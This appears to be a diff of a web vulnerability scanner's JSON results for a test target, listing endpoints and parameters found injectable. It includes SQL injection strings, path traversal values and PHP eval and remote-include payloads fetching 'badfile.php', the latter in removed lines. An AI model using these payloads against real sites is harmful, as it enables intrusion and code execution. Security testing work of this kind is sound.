@@ -4,9 +4,23 @@
         "results": {
             "http://target.com": [
                 {
+                    "endpoint": "/sqli/dynamic.php", 
+                    "params": {
+                        "username": "' or '1=1"
+                    }, 
+                    "method": "POST"
+                }, 
+                {
                     "endpoint": "/sqli/sqli.php", 
                     "params": {
                         "username": "' or '1=1"
+                    }, 
+                    "method": "POST"
+                }, 
+                {
+                    "endpoint": "/sqli/dynamic.php", 
+                    "params": {
+                        "username": "' or '1'='1"
                     }, 
                     "method": "POST"
                 }, 
@@ -18,9 +32,23 @@
                     "method": "POST"
                 }, 
                 {
+                    "endpoint": "/sqli/dynamic.php", 
+                    "params": {
+                        "username": "'or 1=1#"
+                    }, 
+                    "method": "POST"
+                }, 
+                {
                     "endpoint": "/sqli/sqli.php", 
                     "params": {
                         "username": "'or 1=1#"
+                    }, 
+                    "method": "POST"
+                }, 
+                {
+                    "endpoint": "/sqli/dynamic.php", 
+                    "params": {
+                        "username": "' OR '1=1 %00"
                     }, 
                     "method": "POST"
                 }, 
@@ -67,49 +95,28 @@
                     "method": "GET"
                 }, 
                 {
-                    "endpoint": "/serverside/eval.php", 
-                    "params": {
-                        "page": "1; include('http://localhost/badfile.php?')"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/serverside/eval2.php", 
-                    "params": {
-                        "page": "';include('http://localhost/badfile.php?');echo'"
-                    }, 
-                    "method": "POST"
-                }, 
-                {
-                    "endpoint": "/serverside/eval2.php", 
-                    "params": {
-                        "page": "\";include(\"http://localhost/badfile.php?\");echo\""
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/serverside/rfi.php", 
-                    "params": {
-                        "page": "../../index"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/serverside/rfi.php", 
-                    "params": {
-                        "page": "../../index"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/serverside/rfi.php", 
-                    "params": {
-                        "page": "../../index"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
                     "endpoint": "/serverside/lfi1.php", 
+                    "params": {
+                        "page": "../../index"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/serverside/rfi.php", 
+                    "params": {
+                        "page": "../../index"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/serverside/rfi.php", 
+                    "params": {
+                        "page": "../../index"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/serverside/rfi.php", 
                     "params": {
                         "page": "../../index"
                     }, 
@@ -154,27 +161,6 @@
                     "endpoint": "/serverside/lfi2.php", 
                     "params": {
                         "page": "../../index.php"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/serverside/rfi.php", 
-                    "params": {
-                        "page": "http://localhost/badfile.php?"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/serverside/rfi.php", 
-                    "params": {
-                        "page": "http://localhost/badfile.php?"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/serverside/rfi.php", 
-                    "params": {
-                        "page": "http://localhost/badfile.php?"
                     }, 
                     "method": "GET"
                 }
